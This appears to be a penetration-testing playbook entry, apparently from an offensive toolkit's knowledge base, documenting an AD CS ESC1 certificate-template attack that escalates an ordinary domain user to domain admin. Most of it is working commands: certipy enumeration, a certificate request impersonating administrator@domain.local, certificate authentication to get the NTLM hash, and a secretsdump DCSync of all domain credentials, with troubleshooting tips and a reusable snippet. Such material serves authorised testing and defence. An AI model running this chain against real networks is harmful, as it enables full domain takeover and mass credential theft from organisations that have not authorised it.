# [2026-03] AD CS ESC1 Certificate Template Abuse → Domain Admin Privileges

## Scenario Classification
Penetration Testing / AD Attack

## Goal Overview
Use an ESC1 vulnerable template in the AD CS certificate service to obtain a domain admin certificate as an ordinary domain user, and ultimately use DCSync to export all credentials.

## Complete Execution Chain

1. Obtain ordinary domain user credentials (via password spraying).
2. Use certipy to enumerate AD CS configuration.
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Discover the ESC1 vulnerable template (allows arbitrary SAN, low-privileged users can request).
4. Request a certificate as domain admin.
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Use certificate authentication to obtain the NTLM hash.
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync to export all credentials.
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| certipy find times out | LDAP connection blocked by firewall | Use the -ns parameter to specify DNS | 20min |
| Certificate request rejected | Template requires Manager Approval | Switch to another template that does not require approval | 10min |
| auth fails with KDC_ERR_PADATA | DC time is not synchronized | Synchronize time with ntpdate and retry | 5min |

## Toolchain Findings
- certipy is the preferred tool for AD CS attacks; it is more convenient than Certify.exe (pure Python, runs directly on Kali).
- Ensure DNS resolution is correct, otherwise Kerberos authentication will fail.

## Key Code/Commands
See the execution chain above.

## Reusable Patterns/Script Snippets
```bash
# One-stop AD CS quick detection
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Suggestions for This Package
- certipy has been added to the Kali bootstrap manifest ✓
- routing.md already has the "Certipy/AD CS" route ✓

## Evolution Actions
- [x] No update needed (already covered)

## Environment Information
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022, AD CS deployed
- Domain functional level: 2016
